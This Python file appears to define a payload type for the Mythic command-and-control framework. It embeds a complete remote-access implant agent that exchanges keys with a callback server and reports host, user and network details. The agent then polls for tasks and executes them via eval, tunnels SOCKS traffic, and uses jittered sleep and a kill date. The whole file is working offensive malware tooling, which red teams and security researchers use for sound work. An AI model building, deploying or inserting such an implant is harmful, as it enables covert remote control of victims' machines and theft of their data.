from mythic_container.PayloadBuilder import *
from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
from .features.obfuscation import basic_obfuscate, advanced_obfuscate
from .features.evasion import add_evasion_features
from .features.compression import compress_code, create_one_liner
import pathlib
import os
import tempfile
import base64
import json
import logging
import sys
import re
from typing import Dict, Any
import textwrap
import subprocess
from collections import OrderedDict

# Configure logging for debugging
logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[logging.StreamHandler(sys.stderr)]
)
logger = logging.getLogger(__name__)

class Igider(PayloadType):
    name = "igider"
    file_extension = "py"
    author = "@med"
    supported_os = [SupportedOS.Windows, SupportedOS.Linux, SupportedOS.MacOS]
    wrapper = False
    wrapped_payloads = ["pickle_wrapper"]
    mythic_encrypts = False
    translation_container = "myPythonTranslation"
    supports_dynamic_loading = True
    
    build_parameters = []
    c2_profiles = ["http", "https"]
              
    async def build(self) -> BuildResponse:
        resp = BuildResponse(status=BuildStatus.Success)
        build_errors = []
        try:
            base_code = """
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import hashes, hmac, padding
from cryptography.hazmat.backends import default_backend
import base64
import hmac
import os
import random
import sys
import json
import socket
import urllib.request
import time
import platform
import ssl
import getpass
from datetime import datetime
import threading
import queue
import logging

# Configure logging
logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[logging.StreamHandler(sys.stderr)]
)
logger = logging.getLogger(__name__)

class Igider:
    def __init__(self):
        self.socks_open = {}
        self.socks_in = queue.Queue()
        self.socks_out = queue.Queue()
        self.taskings = []
        self._meta_cache = {}
        self.moduleRepo = {}
        self.current_directory = os.getcwd()
        
        # Initialize agent configuration
        self.agent_config = {
            "Server": "callback_host",
            "Port": "callback_port",
            "PostURI": "/post_uri",
            "PayloadUUID": "UUID_HERE",
            "UUID": "",
            "Headers": headers,
            "Sleep": callback_interval,
            "Jitter": callback_jitter,
            "KillDate": "killdate",
            "agent_to_server_key": None,  # Will be set after key exchange
            "server_to_agent_key": None,  # Will be set after key exchange
            "GetURI": "/get_uri",
            "GetParam": "query_path_name",
            "ProxyHost": "proxy_host",
            "ProxyUser": "proxy_user",
            "ProxyPass": "proxy_pass",
            "ProxyPort": "proxy_port",
        }
        
        logger.debug(f"Initialized agent with PayloadUUID: {self.agent_config['PayloadUUID']}")
        
        # Perform key exchange and check-in
        max_checkin_retries = 10
        checkin_retry_delay = 30
        for attempt in range(max_checkin_retries):
            if self.perform_key_exchange() and self.checkIn():
                logger.info("Check-in successful")
                break
            logger.warning(f"Check-in attempt {attempt + 1} failed")
            if attempt < max_checkin_retries - 1:
                time.sleep(checkin_retry_delay)
        else:
            logger.error("Failed to check in after maximum retries")
            os._exit(1)

        try:
            while True:
                if self.passedKilldate():
                    logger.info("Kill date reached, exiting")
                    self.exit(0)
                try:
                    self.getTaskings()
                    self.processTaskings()
                    self.postResponses()
                except Exception as e:
                    logger.error(f"Error in main loop: {str(e)}")
                    max_task_retries = 5
                    task_retry_delay = 10
                    for attempt in range(max_task_retries):
                        try:
                            self.getTaskings()
                            self.processTaskings()
                            self.postResponses()
                            break
                        except Exception as e2:
                            logger.error(f"Retry {attempt + 1} failed: {str(e2)}")
                            if attempt < max_task_retries - 1:
                                time.sleep(task_retry_delay)
                self.agentSleep()
        except KeyboardInterrupt:
            logger.info("Received KeyboardInterrupt, exiting")
            self.exit(0)

    def encrypt(self, data):
        if not data:
            logger.warning("Empty data provided for encryption")
            return b""
        try:
            key = base64.b64decode(self.agent_config["agent_to_server_key"])
            iv = os.urandom(16)
            backend = default_backend()
            cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend)
            encryptor = cipher.encryptor()
            padder = padding.PKCS7(128).padder()
            padded_data = padder.update(data) + padder.finalize()
            ciphertext = encryptor.update(padded_data) + encryptor.finalize()
            h = hmac.HMAC(key, hashes.SHA256(), backend)
            h.update(iv + ciphertext)
            tag = h.finalize()
            logger.debug(f"Encrypted data: IV={base64.b64encode(iv).decode()}, Ciphertext length={len(ciphertext)}")
            return iv + ciphertext + tag
        except Exception as e:
            logger.error(f"Encryption failed: {str(e)}")
            return b""

    def decrypt(self, data):
        if len(data) < 52:  # Minimum: 16 (IV) + 16 (min ciphertext) + 32 (HMAC)
            logger.warning(f"Data too short for decryption: {len(data)} bytes")
            return b""
        try:
            key = base64.b64decode(self.agent_config["server_to_agent_key"])
            iv = data[:16]
            ciphertext = data[16:-32]
            received_tag = data[-32:]
            backend = default_backend()
            h = hmac.HMAC(key, hashes.SHA256(), backend)
            h.update(iv + ciphertext)
            calculated_tag = h.finalize()
            if not hmac.compare_digest(calculated_tag, received_tag):
                logger.error("HMAC verification failed")
                return b""
            cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend)
            decryptor = cipher.decryptor()
            padded_plaintext = decryptor.update(ciphertext) + decryptor.finalize()
            unpadder = padding.PKCS7(128).unpadder()
            plaintext = unpadder.update(padded_plaintext) + unpadder.finalize()
            logger.debug(f"Decrypted data successfully, plaintext length={len(plaintext)}")
            return plaintext
        except Exception as e:
            logger.error(f"Decryption failed: {str(e)}")
            return b""

    def perform_key_exchange(self):
        try:
            data = {
                "action": "key_exchange",
                "uuid": self.agent_config["PayloadUUID"]
            }
            encoded_data = base64.b64encode(json.dumps(data).encode())
            response = self.makeRequest(encoded_data, 'POST')
            if not response:
                logger.error("No response received during key exchange")
                return False
            decoded_response = json.loads(response.decode())
            if decoded_response.get("action") == "key_exchange_response" and decoded_response.get("status") == "success":
                self.agent_config["agent_to_server_key"] = decoded_response["encryption_key"]
                self.agent_config["server_to_agent_key"] = decoded_response["decryption_key"]
                logger.info(f"Key exchange successful: agent_to_server_key={self.agent_config['agent_to_server_key'][:10]}..., server_to_agent_key={self.agent_config['server_to_agent_key'][:10]}...")
                return True
            else:
                logger.error(f"Invalid key exchange response: {decoded_response}")
                return False
        except Exception as e:
            logger.error(f"Key exchange failed: {str(e)}")
            return False

    def formatMessage(self, data, urlsafe=False):
        try:
            output = base64.b64encode(self.agent_config["PayloadUUID"].encode() + self.encrypt(json.dumps(data).encode()))
            if urlsafe:
                output = base64.urlsafe_b64encode(self.agent_config["PayloadUUID"].encode() + self.encrypt(json.dumps(data).encode()))
            logger.debug(f"Formatted message: urlsafe={urlsafe}, length={len(output)}")
            return output
        except Exception as e:
            logger.error(f"Failed to format message: {str(e)}")
            return b""

    def formatResponse(self, data):
        try:
            if not data:
                logger.warning("Empty response data")
                return {}
            decoded_data = self.decrypt(data)
            if not decoded_data:
                logger.error("Decryption failed in formatResponse")
                return {}
            json_data = decoded_data.decode().replace(self.agent_config["PayloadUUID"], "", 1)
            if not json_data.strip():
                logger.warning("Empty JSON data after removing UUID")
                return {}
            parsed = json.loads(json_data)
            logger.debug(f"Parsed response: {parsed}")
            return parsed
        except Exception as e:
            logger.error(f"Failed to format response: {str(e)}")
            return {}

    def postMessageAndRetrieveResponse(self, data):
        try:
            response = self.formatResponse(self.decrypt(self.makeRequest(self.formatMessage(data), 'POST')))
            logger.debug(f"Post response: {response}")
            return response
        except Exception as e:
            logger.error(f"Post message failed: {str(e)}")
            return {}

    def getMessageAndRetrieveResponse(self, data):
        try:
            response = self.formatResponse(self.decrypt(self.makeRequest(self.formatMessage(data, True))))
            logger.debug(f"Get response: {response}")
            return response
        except Exception as e:
            logger.error(f"Get message failed: {str(e)}")
            return {}

    def sendTaskOutputUpdate(self, task_id, output):
        try:
            responses = [{"task_id": task_id, "user_output": output, "completed": False}]
            message = {"action": "post_response", "responses": responses}
            response_data = self.postMessageAndRetrieveResponse(message)
            logger.debug(f"Task output update sent for task_id {task_id}: {response_data}")
        except Exception as e:
            logger.error(f"Failed to send task output update: {str(e)}")

    def postResponses(self):
        try:
            responses = []
            socks = []
            taskings = self.taskings
            for task in taskings:
                if task["completed"]:
                    out = {"task_id": task["task_id"], "user_output": task["result"], "completed": True}
                    if task["error"]:
                        out["status"] = "error"
                    for func in ["processes", "file_browser"]:
                        if func in task:
                            out[func] = task[func]
                    responses.append(out)
            while not self.socks_out.empty():
                socks.append(self.socks_out.get())
            if responses or socks:
                message = {"action": "post_response", "responses": responses}
                if socks:
                    message["socks"] = socks
                response_data = self.postMessageAndRetrieveResponse(message)
                for resp in response_data.get("responses", []):
                    task_index = next((t for t in self.taskings if resp["task_id"] == t["task_id"] and resp["status"] == "success"), None)
                    if task_index:
                        self.taskings.pop(self.taskings.index(task_index))
                logger.debug(f"Posted responses: {response_data}")
        except Exception as e:
            logger.error(f"Failed to post responses: {str(e)}")

    def processTask(self, task):
        try:
            task["started"] = True
            function = getattr(self, task["command"], None)
            if callable(function):
                try:
                    params = json.loads(task["parameters"]) if task["parameters"] else {}
                    params['task_id'] = task["task_id"]
                    command = f"self.{task['command']}(**params)"
                    output = eval(command)
                    logger.debug(f"Task {task['task_id']} executed: {task['command']}")
                except Exception as e:
                    output = str(e)
                    task["error"] = True
                    logger.error(f"Task {task['task_id']} execution failed: {str(e)}")
                task["result"] = output
                task["completed"] = True
            else:
                task["error"] = True
                task["completed"] = True
                task["result"] = "Function unavailable."
                logger.warning(f"Task {task['task_id']} function unavailable: {task['command']}")
        except Exception as e:
            task["error"] = True
            task["completed"] = True
            task["result"] = str(e)
            logger.error(f"Task {task['task_id']} processing failed: {str(e)}")

    def processTaskings(self):
        try:
            threads = []
            taskings = self.taskings
            for task in taskings:
                if not task["started"]:
                    x = threading.Thread(
                        target=self.processTask,
                        name=f"{task['command']}:{task['task_id']}",
                        args=(task,)
                    )
                    threads.append(x)
                    x.start()
                    logger.debug(f"Started thread for task {task['task_id']}: {task['command']}")
        except Exception as e:
            logger.error(f"Failed to process taskings: {str(e)}")

    def getTaskings(self):
        try:
            data = {"action": "get_tasking", "tasking_size": -1}
            tasking_data = self.getMessageAndRetrieveResponse(data)
            for task in tasking_data.get("tasks", []):
                t = {
                    "task_id": task["id"],
                    "command": task["command"],
                    "parameters": task["parameters"],
                    "result": "",
                    "completed": False,
                    "started": False,
                    "error": False,
                    "stopped": False
                }
                self.taskings.append(t)
                logger.debug(f"Received task: {t['task_id']} - {t['command']}")
            if "socks" in tasking_data:
                for packet in tasking_data["socks"]:
                    self.socks_in.put(packet)
                    logger.debug(f"Received socks packet: {packet}")
        except Exception as e:
            logger.error(f"Failed to get taskings: {str(e)}")

    def checkIn(self):
        try:
            hostname = socket.gethostname()
            ip = ''
            if hostname and len(hostname) > 0:
                try:
                    ip = socket.gethostbyname(hostname)
                except:
                    pass
            data = {
                "action": "checkin",
                "ip": ip,
                "os": self.getOSVersion(),
                "user": self.getUsername(),
                "host": hostname,
                "domain": socket.getfqdn(),
                "pid": os.getpid(),
                "uuid": self.agent_config["PayloadUUID"],
                "architecture": "x64" if sys.maxsize > 2**32 else "x86",
            }
            encoded_data = base64.b64encode(self.agent_config["PayloadUUID"].encode() + self.encrypt(json.dumps(data).encode()))
            decoded_data = self.decrypt(self.makeRequest(encoded_data, 'POST'))
            if not decoded_data:
                logger.error("No data returned from check-in request")
                return False
            try:
                response_json = json.loads(decoded_data.replace(self.agent_config["PayloadUUID"], "", 1))
                if "status" in response_json and "id" in response_json:
                    self.agent_config["UUID"] = response_json["id"]
                    logger.info(f"Check-in successful, assigned UUID: {self.agent_config['UUID']}")
                    return True
                else:
                    logger.error(f"Invalid check-in response: {response_json}")
                    return False
            except json.JSONDecodeError as e:
                logger.error(f"Failed to parse check-in response: {str(e)}")
                return False
        except Exception as e:
            logger.error(f"Check-in failed: {str(e)}")
            return False

    def makeRequest(self, data, method='GET', max_retries=5, retry_delay=5):
        try:
            hdrs = {header: self.agent_config["Headers"][header] for header in self.agent_config["Headers"]}
            if method == 'GET':
                url = (
                    f"{self.agent_config['Server']}:{self.agent_config['Port']}"
                    f"{self.agent_config['GetURI']}?{self.agent_config['GetParam']}={data.decode()}"
                )
                req = urllib.request.Request(url, None, hdrs)
            else:
                url = (
                    f"{self.agent_config['Server']}:{self.agent_config['Port']}"
                    f"{self.agent_config['PostURI']}"
                )
                req = urllib.request.Request(url, data, hdrs)

            if self.agent_config["ProxyHost"] and self.agent_config["ProxyPort"]:
                tls = "https" if self.agent_config["ProxyHost"].startswith("https") else "http"
                handler = urllib.request.HTTPSHandler if tls == "https" else urllib.request.HTTPHandler
                proxy_url = f"{tls}://{self.agent_config['ProxyHost'].replace(tls + '://', '')}:{self.agent_config['ProxyPort']}"
                if self.agent_config["ProxyUser"] and self.agent_config["ProxyPass"]:
                    proxy_url = (
                        f"{tls}://{self.agent_config['ProxyUser']}:{self.agent_config['ProxyPass']}@"
                        f"{self.agent_config['ProxyHost'].replace(tls + '://', '')}:{self.agent_config['ProxyPort']}"
                    )
                proxy = urllib.request.ProxyHandler({tls: proxy_url})
                opener = urllib.request.build_opener(proxy, handler())
                urllib.request.install_opener(opener)

            for attempt in range(max_retries):
                try:
                    with urllib.request.urlopen(req) as response:
                        raw_response = response.read()
                        try:
                            out = base64.b64decode(raw_response)
                        except Exception:
                            out = raw_response
                        if out:
                            logger.debug(f"Request successful: method={method}, url={url}, response_length={len(out)}")
                            return out
                except Exception as e:
                    logger.warning(f"Request attempt {attempt + 1} failed: {str(e)}")
                    if attempt < max_retries - 1:
                        time.sleep(retry_delay)
            logger.error(f"Request failed after {max_retries} attempts")
            return b""
        except Exception as e:
            logger.error(f"Failed to make request: {str(e)}")
            return b""

    def getOSVersion(self):
        try:
            if platform.mac_ver()[0]:
                return "macOS " + platform.mac_ver()[0]
            return platform.system() + " " + platform.release()
        except Exception as e:
            logger.error(f"Failed to get OS version: {str(e)}")
            return "Unknown"

    def getUsername(self):
        try:
            return getpass.getuser()
        except:
            for k in ["USER", "LOGNAME", "USERNAME"]:
                if k in os.environ:
                    return os.environ[k]
            logger.warning("Failed to get username")
            return "Unknown"

    def passedKilldate(self):
        try:
            kd_list = [int(x) for x in self.agent_config["KillDate"].split("-")]
            kd = datetime(kd_list[0], kd_list[1], kd_list[2])
            if datetime.now() >= kd:
                logger.info("Kill date reached")
                return True
            return False
        except Exception as e:
            logger.error(f"Failed to check kill date: {str(e)}")
            return False

    def agentSleep(self):
        try:
            j = 0
            if int(self.agent_config["Jitter"]) > 0:
                v = float(self.agent_config["Sleep"]) * (float(self.agent_config["Jitter"]) / 100)
                if int(v) > 0:
                    j = random.randrange(0, int(v))
            sleep_time = self.agent_config["Sleep"] + j
            logger.debug(f"Sleeping for {sleep_time} seconds")
            time.sleep(sleep_time)
        except Exception as e:
            logger.error(f"Failed to execute agent sleep: {str(e)}")

    def exit(self, code):
        logger.info(f"Exiting agent with code {code}")
        os._exit(code)

if __name__ == "__main__":
    igider = Igider()
"""
            base_code = base_code.replace("UUID_HERE", self.uuid)
            for c2 in self.c2info:
                profile = c2.get_c2profile()["name"]
                base_code = self._apply_config_replacements(base_code, c2.get_parameters_dict())
            
            resp.payload = base_code.encode()
            resp.build_message = "Successfully built Python script payload"
            if build_errors:
                resp.build_stderr = "Warnings during build:\n" + "\n".join(build_errors)
            logger.info("Payload build completed successfully")
        except Exception as e:
            resp.set_status(BuildStatus.Error)
            resp.build_stderr = f"Error building payload: {str(e)}"
            logger.error(f"Payload build failed: {str(e)}")
        return resp